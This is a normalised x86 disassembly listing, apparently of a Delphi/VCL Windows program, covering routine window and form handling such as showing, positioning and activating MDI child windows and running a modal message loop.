test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x2f4 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403468
pop esi
pop ebx
retn
sub_45aac0
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x2f4 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb1
call sub_403468
pop esi
pop ebx
retn
sub_45aae4
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_443b74
mov ax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x220 ]
mov eax ebx
call sub_444c2c
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov dx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_444c2c
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_45ab80
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45b0ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_45f294
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x4
xor edx edx
push ebp
push sub_45b0cd
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b0d4
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
xor eax eax
push ebp
push j_sub_40370c#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_403468
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push j_sub_40370c#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_403468
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_459d2c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_441c50
jmp r-xdata
mov eax [ rw-data ]
call sub_45c418
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43d8c8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_4446f8
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_45c40c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43d90c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call IsIconic
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4446f8
call sub_455890
mov ebx eax
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_45c448
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43d8c8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_45c418
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_43e124
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_45c43c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43d90c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_45c40c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_458fdc
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_458fdc
jmp r-xdata
sub_45ac3d
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45e9a8
call sub_403a74
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_45c418
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43d8c8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_45c40c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43d90c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_45c448
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43d8c8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_45c418
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b0d4
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_43e124
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_45c43c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_43d90c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_45c40c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_458fdc
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_458fdc
jmp r-xdata
sub_45afd9
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45e9a8
call sub_403a74
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_459d2c
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_441c50
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_4446f8
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b0d4
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4446f8
call sub_455890
mov ebx eax
sub_45b120
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
sub_45b178
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c4c0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45b1d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40326c
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_45b1e4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffab
call sub_403468
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45b210
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x2f4 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov [ ebx + 0x24c ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x228 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_45e994
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffb0
call sub_403468
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_45b3b0
jmp r-xdata
mov eax ebx
call sub_45b44c
mov dl 0x1
mov eax ebx
call sub_458f9c
jmp r-xdata
sub_45b2b4
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_458928
mov esi eax
dec esi
test esi esi
jl r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_458974
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
sub_45b318
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_40370c#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_403468
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45b44c
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45b3d0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_45b43e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b445
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_459c28
sub_45b468
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45b730
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_43c724
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_45d908
xor edx edx
push ebp
push sub_45b713
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_413a44
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_45c938
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_455740
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_45b6f1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_45b3b8
xor edx edx
push ebp
push sub_45b650
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45b318
call GetCapture
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_45e714
mov eax [ rw-data ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_4446f8
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_4446f8
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b657
mov eax [ ebp - 0x4 ]
call sub_45b3b0
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_45b657
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b6fb
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45c938
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_45c938
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_4139c0
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_413b0c
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_4557f4
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_45b740
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_441428
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45b740
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4413ec
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_45b7b0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov esi [ ebx + 0x248 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_45b740
pop ecx
mov eax [ esi + 0x34 ]
call sub_450214
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x248 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_450224
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_45b834
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
